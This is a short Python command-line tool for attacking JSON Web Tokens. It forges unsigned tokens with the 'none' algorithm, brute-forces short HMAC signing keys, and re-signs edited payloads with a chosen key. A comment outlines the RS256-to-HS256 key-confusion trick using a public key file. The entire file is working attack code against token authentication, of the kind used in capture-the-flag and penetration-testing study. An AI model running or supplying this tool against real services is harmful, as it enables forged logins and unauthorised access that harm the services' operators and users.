import jwt
from argparse import ArgumentParser
from string import printable
from itertools import product
from json import loads

MAX_LENGTH = 8


def none_token(p):
    return jwt.encode(p, str(), algorithm='none')


def bruteKey(j):
    alg = (jwt.get_unverified_header(j))['alg']
    i = 1
    res = str()
    while i < MAX_LENGTH:
        if res:
            break
        for items in product(printable, repeat=i):
            try:
                res = jwt.decode(j, ''.join(items), algorithm=alg)
            except Exception:
                continue
            else:
                break
        i += 1
    return (''.join(items), res)


def main():
    parser = ArgumentParser(description='Play with basic JWT vuln')
    parser.add_argument('jwt',
                        help='the token to decode')
    parser.add_argument('-n', '--none',
                        help='Generate a token with none algorithm')
    parser.add_argument('-b', '--brute', action='store_true',
                        help='Bruteforce a key')
    parser.add_argument('-e', '--encode',
                        help='encode a token with a given key.')
    parser.add_argument('-a', '--algorithm', default='HS256',
                        help='Specify the algorithm to use.')
    args = parser.parse_args()
    if not args.encode:
        header = jwt.get_unverified_header(args.jwt)
        print("Header: " + str(header))
    if args.encode:
        """ cat key.pem | xxd -p | tr -d \n
        echo -n "MYTOKEN" | openssl dgst -sha256 -mac HMAC -macopt hexkey:PREVIOUS_RESULT
        """
        try:
            with open(args.encode, 'r') as fkey:
                key = ''.join(fkey.readlines())
        except Exception:
            key = args.encode
        print(jwt.encode(loads(args.jwt), key,
              algorithm=args.algorithm, ))
    elif args.none:
        p = jwt.decode(args.jwt, verify=None)
        print("Decoded Payload: " + str(p))
        print("New Encoded Payload: " + str(none_token(loads(args.none))))
    elif args.brute:
        res = bruteKey(args.jwt)
        if res[1]:
            print("Key found: " + res[0])
            print("Payload: " + str(res[1]))
    else:
        print("Payload: " + str(jwt.decode(args.jwt, verify=None)))


if __name__ == "__main__":
    main()
